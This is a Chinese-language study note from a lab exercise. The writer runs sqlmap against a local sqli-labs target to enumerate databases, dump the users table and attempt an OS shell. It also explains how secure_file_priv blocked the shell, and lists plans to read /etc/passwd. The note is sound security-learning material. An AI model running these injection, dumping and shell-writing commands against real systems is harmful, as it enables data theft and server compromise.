# 2026-09-03 sqlmap 全流程实操（CCP 备考练手 + os-shell 限制踩坑）

> 状态：✅ 实操过
> 目标：sqlmap 全流程盲操（--dbs → --tables → --dump → --os-shell）跑通一遍（CCP 备考 9/3 任务）
> 环境：sqli-labs（Docker，Windows 127.0.0.1:8081，Less-1 字符型注入）· sqlmap 1.10.7（SecurityTools）

## 靶场与注入点

- URL：`http://127.0.0.1:8081/Less-1/?id=1`（GET 字符型单引号注入）
- sqlmap 自动识别 4 种注入类型：
  - boolean-based blind（AND 8633=8633）
  - error-based（EXTRACTVALUE 报错注入，MySQL >= 5.1）
  - time-based blind（SLEEP(5)）
  - UNION query（3 列）

## 全流程命令与结果

### ① 枚举数据库
```bash
python sqlmap.py -u "http://127.0.0.1:8081/Less-1/?id=1" --batch --dbs
# 5 个库：challenges / information_schema / mysql / performance_schema / security
```

### ② 枚举表
```bash
python sqlmap.py -u "http://127.0.0.1:8081/Less-1/?id=1" --batch -D security --tables
# 4 张表：emails / referers / uagents / users
```

### ③ 脱库
```bash
python sqlmap.py -u "http://127.0.0.1:8081/Less-1/?id=1" --batch -D security -T users --dump
# 15 条：Dumb(11) / Angelina(0) / ... / admin(111) / admin'(admin) ...
# CSV 落盘：C:\Users\huoyuchen\AppData\Local\sqlmap\output\127.0.0.1\dump\security\users.csv
```

### ④ 写 shell（失败）
```bash
python sqlmap.py -u "http://127.0.0.1:8081/Less-1/?id=1" --batch --os-shell
# ❌ 所有 web 根目录尝试都报 "no write privileges"
# 指定正确根目录仍失败：--web-root "/var/www/html" 也一样
```

## 踩坑：os-shell 失败的真正原因（secure_file_priv）

**排查链：**
1. `--is-dba` → **current user is DBA: True**（MySQL 权限没问题！）
2. `SELECT @@global.secure_file_priv` → 返回 **' '（一个空格）**

**结论**：MySQL 5.7+ 的 `secure_file_priv` 把 `INTO OUTFILE` 限定到指定目录（NULL=完全禁用、''=不限制、路径=仅该目录）。本环境设成了 `' '`（指向无效目录）→ **等于禁用了 OUTFILE 写文件** → os-shell 的 stager 写不进去。这是环境限制，不是命令/操作错误。

**认知更新**：
- **DBA 权限 ≠ 能写文件**。要 os-shell 成功需要三层同时满足：① MySQL 高权限（FILE 权限）② `secure_file_priv` 不限制（老 MySQL/空值）③ mysqld 进程用户对 web 目录有写权限
- sqlmap 报 "no write privileges" 时先查 `secure_file_priv`，别急着怀疑目录权限
- os-shell 能成功的典型场景：老版本 MySQL（5.1 前无此限制）、宽松配置、root 无密码连本机 + /var/www 可写（很多低配靶场/老 CMS 环境）
- secure_file_priv 是 MySQL 5.7 引入的 OUTFILE/LOAD_FILE 安全限制，实战中遇到就换思路（UDF 也被挡；可读文件 --file-read 不受影响）

## 收获

- sqlmap 四步流程 + --batch 免交互 + 会话续跑（resumed from stored session，重复跑不重复探测）
- 输出解读：注入类型特征、库/表/字段结构、CSV 落盘位置
- os-shell 限制认知（secure_file_priv 三层模型）
- 工具用法：--is-dba / --sql-query / --web-root / --dbs / -D -T --dump

## 待实践

- 换个宽松 MySQL 环境（如 DVWA 或老靶场）跑通 --os-shell 完整拿 shell
- 试 --sql-shell / --file-read 读 /etc/passwd（验证读不受 secure_file_priv 影响）

> ⚠️ 声明：仅限授权环境（靶场/CTF/授权渗透）中测试。
